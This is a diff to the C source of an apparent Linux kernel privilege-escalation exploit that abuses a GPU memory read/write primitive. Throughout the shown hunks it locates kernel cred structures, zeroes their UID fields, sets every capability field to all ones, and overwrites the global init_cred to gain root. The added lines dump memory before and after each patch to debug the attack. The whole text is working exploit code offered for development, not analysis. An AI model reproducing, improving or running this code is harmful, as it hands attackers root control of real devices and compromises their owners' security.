@@ -1249,6 +1249,28 @@ static int patch_cred_via_gpu(int fd, uint64_t cred_ptr, uint64_t real_cred_ptr)
     return 0;
 }
 
+// Helper: dump first N bytes as hex+ASCII to stderr
+static void hex_dump(const char *tag, const void *data, size_t size, size_t max_bytes) {
+    if (max_bytes > size) max_bytes = size;
+    const uint8_t *p = (const uint8_t *)data;
+    fprintf(stderr, "    [DUMP] %s (%zu bytes):\n", tag, max_bytes);
+    for (size_t i = 0; i < max_bytes; i += 16) {
+        fprintf(stderr, "    [DUMP] %04zx: ", i);
+        for (size_t j = 0; j < 16; j++) {
+            if (i + j < max_bytes) fprintf(stderr, "%02x ", p[i + j]);
+            else fprintf(stderr, "   ");
+            if (j == 7) fprintf(stderr, " ");
+        }
+        fprintf(stderr, " |");
+        for (size_t j = 0; j < 16 && (i + j) < max_bytes; j++) {
+            uint8_t c = p[i + j];
+            fprintf(stderr, "%c", (c >= 32 && c < 127) ? c : '.');
+        }
+        fprintf(stderr, "|\n");
+    }
+    fflush(stderr);
+}
+
 static int mass_patch_creds(int fd, uint32_t target_uid) {
     fprintf(stderr, "[PARENT] --- STARTING MASS CRED PATCH (Target UID: %u) ---\n", target_uid);
     int patch_count = 0;
@@ -1276,21 +1298,25 @@ static int mass_patch_creds(int fd, uint32_t target_uid) {
                     uint32_t next1 = *(uint32_t *)(page + off + 4);
                     uint32_t next2 = *(uint32_t *)(page + off + 8);
                     if (next1 == 10237 && next2 == 10237) {
+                        // DUMP PAGE CONTEXT (first 256 bytes around match for diagnosis)
+                        size_t dump_start = (off >= 32) ? (off - 32) : 0;
+                        char tag[160];
+                        snprintf(tag, sizeof(tag), "Page 0x%lx UID match at +0x%x (256B window)", (unsigned long)va, off);
+                        hex_dump(tag, page + dump_start, PAGE_SIZE - dump_start, 256);
+
                         // CRITICAL VALIDATION: Check usage field at off-4 (real cred has usage > 0)
-                        // and also verify it's not the spray memory (spray pages have NO atomic_t usage before UID)
                         uint32_t usage_field = 0;
                         int valid_cred = 0;
 
                         if (off >= 4) {
                             usage_field = *(uint32_t *)(page + off - 4);
-                            // Real cred: usage is 1..1000 (atomic_t), typically 1-10
                             if (usage_field >= 1 && usage_field <= 100) {
                                 valid_cred = 1;
                             }
                         }
 
                         if (!valid_cred) {
-                            // Skip - this is likely spray memory or task_struct fields, not cred
+                            fprintf(stderr, "    [DUMP] -> SKIPPED (usage=%u, not a real cred)\n\n", usage_field);
                             continue;
                         }
 
@@ -1303,12 +1329,6 @@ static int mass_patch_creds(int fd, uint32_t target_uid) {
                         gpu_write_task_virt(fd, va + off, zero_creds, 32);
 
                         // 2) Patch all 5 capability fields
-                        //    Offsets relative to UID block start (off):
-                        //      cap_inheritable: off + 0x24
-                        //      cap_permitted:   off + 0x2c
-                        //      cap_effective:   off + 0x34
-                        //      cap_bset:        off + 0x3c
-                        //      cap_ambient:     off + 0x44
                         uint8_t all_caps[8];
                         memset(all_caps, 0xff, 8);
                         gpu_write_task_virt(fd, va + off + 0x24, all_caps, 8);
@@ -1316,6 +1336,15 @@ static int mass_patch_creds(int fd, uint32_t target_uid) {
                         gpu_write_task_virt(fd, va + off + 0x34, all_caps, 8);
                         gpu_write_task_virt(fd, va + off + 0x3c, all_caps, 8);
                         gpu_write_task_virt(fd, va + off + 0x44, all_caps, 8);
+
+                        // VERIFY: re-read and dump patched region
+                        uint8_t verify_page[256];
+                        if (gpu_read_task_struct(fd, va + ((off >= 16) ? (off - 16) : 0), verify_page, 256) == 0) {
+                            char vtag[160];
+                            snprintf(vtag, sizeof(vtag), "POST-PATCH verify at 0x%lx + 0x%x", (unsigned long)va, off);
+                            hex_dump(vtag, verify_page, 256, 256);
+                        }
+                        fprintf(stderr, "\n");
                         usleep(5000);
                     }
                 }
@@ -1404,7 +1433,21 @@ static int parent_patch_root(int fd, uint64_t cred_ptr) {
 #ifdef INIT_CRED_OFFSET
         uint64_t init_cred_va = kernel_base + INIT_CRED_OFFSET;
         fprintf(stderr, "[PARENT] Patching global init_cred at 0x%lx...\n", (unsigned long)init_cred_va);
+
+        // DUMP init_cred before patch
+        uint8_t init_cred_buf[256];
+        if (gpu_read_task_struct(fd, init_cred_va, init_cred_buf, 256) == 0) {
+            hex_dump("INIT_CRED before patch", init_cred_buf, 256, 256);
+            fprintf(stderr, "\n");
+        }
+
         patch_cred_via_gpu(fd, init_cred_va, 0);
+
+        // DUMP init_cred after patch
+        if (gpu_read_task_struct(fd, init_cred_va, init_cred_buf, 256) == 0) {
+            hex_dump("INIT_CRED AFTER patch", init_cred_buf, 256, 256);
+            fprintf(stderr, "\n");
+        }
         
         // Verification
         uint32_t verify_cred[2];
@@ -1462,11 +1505,46 @@ static int parent_patch_root(int fd, uint64_t cred_ptr) {
             }
         }
 
+        // DUMP the page around comm+0x818 for diagnosis
+        if (task_va != 0) {
+            uint64_t page_base = task_va & ~0xFFFULL;
+            uint8_t task_page[PAGE_SIZE];
+            if (gpu_read_task_struct(fd, page_base, task_page, PAGE_SIZE) == 0) {
+                size_t dump_off = (task_va - page_base >= 0x800) ? (task_va - page_base - 32) : 0;
+                char ptag[160];
+                snprintf(ptag, sizeof(ptag), "TASK page 0x%lx (comm+0x818 area)", (unsigned long)page_base);
+                hex_dump(ptag, task_page + dump_off, PAGE_SIZE - dump_off, 512);
+                fprintf(stderr, "\n");
+            }
+        }
+
+        // DUMP found CRED structure (256 bytes) for diagnosis
+        if (c != 0 && (c >> 48) == 0xffff) {
+            uint8_t cred_dump[256];
+            if (gpu_read_task_struct(fd, c, cred_dump, 256) == 0) {
+                char ctag[160];
+                snprintf(ctag, sizeof(ctag), "CRED @ 0x%lx (before patch)", (unsigned long)c);
+                hex_dump(ctag, cred_dump, 256, 256);
+                fprintf(stderr, "\n");
+            }
+        }
+
         if ((rc >> 48) == 0xffff) {
             patch_cred_via_gpu(fd, rc, 0);
         }
         if ((c >> 48) == 0xffff) {
             patch_cred_via_gpu(fd, c, rc);
+        }
+
+        // VERIFY: dump cred AFTER patch
+        if (c != 0 && (c >> 48) == 0xffff) {
+            uint8_t cred_after[256];
+            if (gpu_read_task_struct(fd, c, cred_after, 256) == 0) {
+                char ctag2[160];
+                snprintf(ctag2, sizeof(ctag2), "CRED @ 0x%lx (AFTER patch)", (unsigned long)c);
+                hex_dump(ctag2, cred_after, 256, 256);
+                fprintf(stderr, "\n");
+            }
         }
 
         // Verification of process patch
